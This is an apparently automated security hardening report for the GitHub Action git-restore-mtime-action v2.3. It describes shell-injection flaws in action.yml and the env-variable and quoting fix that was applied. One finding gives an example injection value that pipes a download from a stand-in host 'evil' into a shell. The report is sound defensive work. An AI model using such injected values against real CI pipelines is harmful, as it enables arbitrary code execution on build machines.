<!-- markdownlint-disable -->

# Hardening Report: chetan--git-restore-mtime-action/v2.3

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **chetan--git-restore-mtime-action/v2.3** was hardened automatically. 3 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Sub-rule (a): GitHub Actions expressions are placed directly inside the composite action's run: script: `cd "${{ inputs.working-directory }}" && "$GITHUB_ACTION_PATH"/git-restore-mtime ${{ inputs.args }}`. Both inputs.working-directory and inputs.args are substituted into the script before the shell runs it, so a caller-supplied value with shell metacharacters (e.g. `"; curl evil | sh; "` or `$(...)`) runs as code. inputs.args is also unquoted. Fix: pass both through env: (e.g. WORKING_DIRECTORY, INPUT_ARGS) and use quoted expansions, such as cd "$WORKING_DIRECTORY". For args, read them into an array with `read -ra ARGS <<< "$INPUT_ARGS"` and pass "${ARGS[@]}" so that word splitting doesn't let the shell evaluate anything.

Locations:

- `action.yml:21`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.working-directory }}" appears directly in run: block of step ""; move to env: map

Locations:

- `action.yml:21`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.args }}" appears directly in run: block of step ""; move to env: map

Locations:

- `action.yml:21`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, static-inline-injection

**Notes:**

In action.yml, inputs.working-directory and inputs.args now go through env: as INPUT_WORKING_DIRECTORY and INPUT_ARGS. The run: step quotes both (cd "$INPUT_WORKING_DIRECTORY"). args is a list of arguments, so I used the quote-aware xargs split instead of the suggested 'read -ra'. Upstream pasted the expression straight into the script, so quotes inside the value worked; this keeps that. The split has an empty-value guard, xargs -r, and a pre-check that fails on an unmatched quote. Then "${args[@]}" passes the pieces to git-restore-mtime. Nothing in the value gets evaluated.

